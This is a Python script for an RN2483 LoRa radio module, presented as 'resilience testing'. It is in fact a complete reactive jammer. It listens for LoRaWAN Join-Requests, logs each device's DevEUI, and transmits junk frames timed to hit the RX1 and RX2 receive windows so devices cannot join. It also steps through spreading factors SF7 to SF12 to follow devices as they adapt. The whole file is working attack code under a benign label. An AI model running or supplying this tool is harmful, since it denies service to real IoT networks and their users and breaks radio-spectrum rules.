#!/usr/bin/env python3
import time
import serial
import argparse 
from serial.threaded import LineReader, ReaderThread
from datetime import datetime

# Configuration for RF testing and robustness analysis
parser = argparse.ArgumentParser(description='RF Resilience Analysis: Adaptive SF Recovery Testing')
parser.add_argument('port', nargs='?', default='COM11', help='Serial port for the LoRa module')
args = parser.parse_args()

def get_ms():
    """Returns high-resolution timestamp for event logging."""
    return datetime.now().strftime('%H:%M:%S.%f')[:-3]

class LoRaResilienceTester(LineReader):
    """
    Analyzes LoRaWAN network stability by simulating selective 
    interference across multiple Spreading Factors (SF7-SF12).
    """
    def connection_made(self, transport):
        self.transport = transport
        self.current_sf = 7
        self.join_counter = 0 
        print(f"[{get_ms()}] INITIALIZING: Hard reset of the transceiver module...")
        self.write_line('sys reset')
        time.sleep(1.5) 
        print(f"[{get_ms()}] OPERATIONAL MODE: Multi-SF Protocol Analysis Active")
        self.full_setup()

    def full_setup(self):
        """Initializes baseline physical layer parameters."""
        self.send_cmd('mac pause')
        self.send_cmd('radio set freq 868100000')
        self.send_cmd(f'radio set sf sf{self.current_sf}')
        self.send_cmd('radio set bw 125')
        self.send_cmd('radio set pwr 14')
        self.send_cmd('radio rx 0')
        print(f"[{get_ms()}] CONFIGURATION COMPLETE: Monitoring 868.1 MHz | SF{self.current_sf}")

    def handle_line(self, data):
        data = data.strip()
        if data.startswith("RN2483") or not data or data in ["ok", "radio_tx_ok"]:
            return

        if len(data) < 20:
            if "radio_err" in data or "busy" in data: 
                self.send_cmd('radio rx 0', delay=0.01)
            return

        # --- CRITICAL TIMING & PACKET ANALYSIS ---
        start_time = time.time()
        self.join_counter += 1
        
        # DevEUI Extraction with Endianness correction (Little-Endian to Big-Endian)
        payload = data.replace("radio_rx  ", "").strip()
        dev_eui = "UNKNOWN"
        if len(payload) >= 34:
            raw_eui = payload[18:34]
            bytes_list = [raw_eui[i:i+2] for i in range(0, len(raw_eui), 2)]
            dev_eui = "".join(reversed(bytes_list)).upper()

        print(f"[{get_ms()}] SIGNAL DETECTED: Join-Request from DevEUI: {dev_eui}")

        # --- INTERFERENCE EXECUTION (Original Logic) ---
        if self.current_sf == 7:
            time.sleep(4.3) 
            print(f"[{get_ms()}] INTERFERENCE: Targeting RX1 (868.1 MHz) | Profile SF7")
            self.write_line("radio tx " + "F" * 400)
            time.sleep(0.35)
            self.write_line("radio tx " + "F" * 400)
            
            time.sleep(0.1)
            self.send_cmd('radio set freq 869525000', delay=0.01)
            self.send_cmd('radio set sf sf12', delay=0.01)
            wait_for_rx2 = 5.92 - (time.time() - start_time)
            if wait_for_rx2 > 0: time.sleep(wait_for_rx2)
            print(f"[{get_ms()}] INTERFERENCE: Targeting RX2 (869.525 MHz) | Profile SF12")
            self.write_line("radio tx " + "F" * 20)

        elif self.current_sf == 8:
            time.sleep(4.6) 
            print(f"[{get_ms()}] INTERFERENCE: Targeting RX1 (868.1 MHz) | Profile SF8")
            self.write_line("radio tx " + "F" * 500)
            
            self.send_cmd('radio set freq 869525000', delay=0.01)
            self.send_cmd('radio set sf sf12', delay=0.01)
            wait_for_rx2 = 5.95 - (time.time() - start_time)
            if wait_for_rx2 > 0: time.sleep(wait_for_rx2)
            print(f"[{get_ms()}] INTERFERENCE: Targeting RX2 (869.525 MHz) | Profile SF12")
            self.write_line("radio tx " + "F" * 50) 

        elif self.current_sf == 9:
            time.sleep(4.2) 
            print(f"[{get_ms()}] INTERFERENCE: Targeting RX1 (868.1 MHz) | Profile SF9")
            self.write_line("radio tx " + "F" * 510)
            self.write_line("radio tx " + "F" * 510)
            
            self.send_cmd('radio set freq 869525000', delay=0.01)
            self.send_cmd('radio set sf sf12', delay=0.01)
            wait_for_rx2 = 5.90 - (time.time() - start_time)
            if wait_for_rx2 > 0: time.sleep(wait_for_rx2)
            print(f"[{get_ms()}] INTERFERENCE: Targeting RX2 (869.525 MHz) | Profile SF12")
            self.write_line("radio tx " + "F" * 250) 

        else:
            print(f"[{get_ms()}] INTERFERENCE: Spectrum Saturation for SF{self.current_sf} (SF12 Overpower)")
            self.send_cmd('radio set sf sf12', delay=0.01)
            time.sleep(4.5) 
            self.write_line("radio tx " + "F" * 200)
            time.sleep(2.3)

        # --- STATE TRANSITION MANAGEMENT ---
        time.sleep(0.1) 
        if self.join_counter >= 3:
            self.current_sf += 1
            self.join_counter = 0
            if self.current_sf > 12: self.current_sf = 12
            print(f"[{get_ms()}] TRANSITION: Stepping to Spreading Factor SF{self.current_sf}")

        # Recovery to primary monitoring channel
        self.send_cmd('radio set freq 868100000', delay=0.01)
        self.send_cmd(f'radio set sf sf{self.current_sf}', delay=0.01)
        self.write_line('radio rx 0') 

    def send_cmd(self, cmd, delay=0.05):
        self.write_line(cmd)
        if delay > 0: time.sleep(delay)

    def write_line(self, text):
        self.transport.write(f'{text}\r\n'.encode())

# Initialize Serial Connection
try:
    ser = serial.Serial(args.port, baudrate=57600)
    with ReaderThread(ser, LoRaResilienceTester) as protocol:
        print(f"[{get_ms()}] SYSTEM: Analyzing channel... Press Ctrl+C to stop.")
        while True:
            try: time.sleep(1)
            except KeyboardInterrupt: break
except Exception as e:
    print(f"[{get_ms()}] CRITICAL ERROR: {e}")